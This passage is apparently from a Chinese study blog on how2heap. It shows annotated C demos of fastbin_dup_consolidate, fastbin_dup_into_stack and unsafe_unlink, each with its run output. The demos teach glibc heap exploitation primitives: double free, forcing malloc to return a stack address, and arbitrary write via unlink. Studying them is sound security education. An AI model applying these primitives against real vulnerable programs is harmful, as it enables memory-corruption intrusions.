technique that bypasses the double free check in tcachebin.&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);<br><br><br><br>	<span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>);		<span class="hljs-comment">// 分配一个大小为0x40的堆块</span><br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(p1);<br><br><br><span class="hljs-comment">// 再次malloc的时候，会调用consolidate函数来整理fastbin，由于p1和top chunk相邻，直接合并</span><br>	<span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);<br><br><br><br>	assert(p1 == p3);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(p1);<br><span class="hljs-comment">//此时，p1所指向的实际是0x400的p3堆块，实际上释放的是p3堆块</span><br><br><br>	<span class="hljs-type">void</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><br><br><span class="hljs-comment">//p1,p2,p3都一样</span><br>	assert(p4 == p3);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_consolidate<br>This is a powerful technique that bypasses the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> check in tcachebin.<br>Fill up the tcache <span class="hljs-built_in">list</span> to force the fastbin usage...<br>Allocate another chunk of the same size p1=<span class="hljs-number">0x1a13420</span> <br>Freeing p1 will add this chunk to the fastbin <span class="hljs-built_in">list</span>...<br><br>Allocating a tcache-sized chunk (p3=<span class="hljs-number">0x1a13420</span>)<br>will trigger the malloc_consolidate and merge<br>the fastbin chunks into the top chunk, thus<br>p1 and p3 are now pointing to the same chunk !<br><br>Triggering the <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> vulnerability!<br><br>The <span class="hljs-type">double</span> <span class="hljs-built_in">free</span> added the chunk referenced by p1 <br>to the tcache thus the next similar-size <span class="hljs-built_in">malloc</span> will<br>point to p3: p3=<span class="hljs-number">0x1a13420</span>, p4=<span class="hljs-number">0x1a13420</span><br></code></pre></td></tr></table></figure>

<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 该技术通常用来将堆块分配在栈上</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><br>	       <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br><br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br><br>	<span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	<span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>	<span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(a);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br><br>	<span class="hljs-comment">// free(a);</span><br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br><br>	<span class="hljs-built_in">free</span>(b);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">free</span>(a);<br><br><br><span class="hljs-comment">// 这时候形成了堆块a和堆块b的循环链表</span><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><br>		<span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><br>		<span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><br>		<span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><br>		<span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br><br>	stack_var = <span class="hljs-number">0x20</span>;<br><br><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br><br>	*d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br><span class="hljs-comment">// 需要对堆块a有修改的权限，修改其fd指针区域</span><br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./fastbin_dup_into_stack<br>This file extends on fastbin_dup.c by tricking <span class="hljs-built_in">malloc</span> into<br>returning a pointer to a controlled <span class="hljs-title function_">location</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">stack</span>)</span>.<br>The address we want <span class="hljs-title function_">malloc</span><span class="hljs-params">()</span> to <span class="hljs-keyword">return</span> is 0x7ffd5d534248.<br>Allocating 3 buffers.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5050<br>Freeing the first one...<br>If we <span class="hljs-built_in">free</span> 0x1ae5010 again, things will crash because 0x1ae5010 is at the top of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll <span class="hljs-built_in">free</span> 0x1ae5030.<br>Now, we can <span class="hljs-built_in">free</span> 0x1ae5010 again, since it&#x27;s not the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010, 0x1ae5030, 0x1ae5010 ]. We&#x27;ll now carry out our attack by modifying data at 0x1ae5010.<br>1st <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010<br>2nd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5030<br>Now the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span> has [ 0x1ae5010 ].<br>Now, we have access to 0x1ae5010 <span class="hljs-keyword">while</span> it remains at the head of the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span>.<br>so now we are writing a fake <span class="hljs-built_in">free</span> <span class="hljs-title function_">size</span> <span class="hljs-params">(in this <span class="hljs-keyword">case</span>, <span class="hljs-number">0x20</span>)</span> to the <span class="hljs-built_in">stack</span>,<br>so that <span class="hljs-built_in">malloc</span> will think there is a <span class="hljs-built_in">free</span> chunk there and agree to<br><span class="hljs-keyword">return</span> a pointer to it.<br>Now, we overwrite the first 8 bytes of the data at 0x1ae5010 to point right before the 0x20.<br>3rd <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x1ae5010, putting the <span class="hljs-built_in">stack</span> address on the <span class="hljs-built_in">free</span> <span class="hljs-built_in">list</span><br>4th <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>: 0x7ffd5d534248<br></code></pre></td></tr></table></figure>



<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 使用unlink实现任意地址写，想要深刻理解还是需要对c语言的指针操作和链表操作有一定的认识</span><br><span class="hljs-comment">// 很重要的一点是需要一个全局变量来存储malloc得到的指针</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);<br><span class="hljs-comment">// 需要一个全局变量</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);<br><br><br><span class="hljs-comment">// unlink的前提是不使用fastbin</span><br>	<span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//we want to be big enough not to use fastbins</span><br><br>	<span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);<br><br><br><br>	chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br><br>	<span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><span class="hljs-comment">// 注意ptr0的指针所在的地址和其本身的值</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br><span class="hljs-comment">// 这里是修改fake_chunk的fd指针来绕过p-&gt;fd-&gt;bk = p的检查，注意这里是ptr0指针的地址减去对应的值</span><br>	chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br><span class="hljs-comment">// 这里是修改fake_chunk的bk指针来绕过p-&gt;bk-&gt;fd = p的检查，注意这里是ptr0指针的地址减去对应的值</span><br>	chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<br><span class="hljs-comment">// 这里需要一个堆溢出，设置chunk1的头，chunk1是高地址的一个堆块</span><br>	<span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);<br><span class="hljs-comment">// 设置chunk1的pre_size，这样才能使得chunk1找到fake_chunk去脱链，从而找到我们伪造的fd和bk</span><br>	chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<br><span class="hljs-comment">// 设置上一个堆块处于释放状态</span><br>	chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);<br><br>	<span class="hljs-built_in">free</span>(chunk1_ptr);<br><span class="hljs-comment">// 这样，我们chunk0_ptr指针的地址里面存储的就是这个地址减去3个字节处的地址</span><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);<br><br>	<span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br><br>	<span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br><br>	chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><span class="hljs-comment">// 修改chunk0_ptr指向字符串指针</span><br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original value: %s\n&quot;</span>,victim_string);<br><br>	chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br><br><br>	<span class="hljs-comment">// sanity check</span><br><br>	assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242</span>L);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap$ ./unsafe_unlink<br>Welcome to unsafe unlink <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">14.04</span>/<span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique can be used when you have a pointer at a known location to a region you can call unlink on.<br>The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.<br>The point of this exercise is to use <span class="hljs-built_in">free</span> to corrupt the global chunk0_ptr to achieve arbitrary memory write.<br><br>The global chunk0_ptr is at <span class="hljs-number">0x602078</span>, pointing to <span class="hljs-number">0x116c010</span><br>The victim chunk we are going to corrupt is at <span class="hljs-number">0x116c0a0</span><br><br>We create a fake chunk inside chunk0.<br>We setup the <span class="hljs-string">&#x27;next_free_chunk&#x27;</span> (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.<br>We setup the <span class="hljs-string">&#x27;previous_free_chunk&#x27;</span> (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.<br>With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br>Fake chunk fd: <span class="hljs-number">0x602060</span><br>Fake chunk bk: <span class="hljs-number">0x602068</span><br><br>We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.<br>We shrink the size of chunk0 (saved as <span class="hljs-string">&#x27;previous_size&#x27;</span> in chunk1) so that <span class="hljs-built_in">free</span> will think that chunk0 starts where we placed our fake chunk.<br>It<span class="hljs-number">&#x27;</span>s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly<br>If we had <span class="hljs-string">&#x27;normally&#x27;</span> freed chunk0, chunk1.previous_size would have been <span class="hljs-number">0x90</span>, however this is its new value: <span class="hljs-number">0x80</span><br>We mark our fake chunk as <span class="hljs-built_in">free</span> by setting <span class="hljs-string">&#x27;previous_in_use&#x27;</span> of chunk1 as False.<br><br>Now we <span class="hljs-built_in">free</span> chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.<br>You can find the source of the unlink macro at https:<span class="hljs-comment">//sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><br>At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.<br>chunk0_ptr is now pointing where we want, we use it to overwrite our victim <span class="hljs-built_in">string</span>.<br>Original value: Hello!~<br>New Value: BBBBAAAA<br></code></pre></td></tr></table></figure>

